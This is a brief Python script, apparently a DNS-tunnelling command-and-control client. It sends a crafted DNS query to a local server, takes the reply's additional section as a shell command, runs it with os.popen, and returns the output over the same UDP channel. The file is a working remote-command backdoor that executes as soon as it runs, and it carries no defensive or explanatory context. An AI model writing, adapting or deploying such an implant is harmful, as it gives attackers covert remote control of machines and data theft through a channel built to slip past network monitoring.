import socket
import os
from packs.BaseHeader import BaseHeader
from packs.BaseQuestion import BaseQuestion
from packs.EncodeResponse import EncodeResponse


def dns_client():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = BaseHeader().get_header() + BaseQuestion('www.bbb.com').get_question()
    address = ('127.0.0.1', 53)
    s.sendto(data, address)
    rel_data, rel_address = s.recvfrom(2048)
    order = EncodeResponse(rel_data, rel_address)
    print(order.get_additional())
    if order.get_additional() != b'\x00':
        cmd = order.additional.decode()
        temp = os.popen(cmd).read()
        rel = data + bytes(temp, encoding='gbk')
        print(rel)
        s.sendto(rel, address)


dns_client()


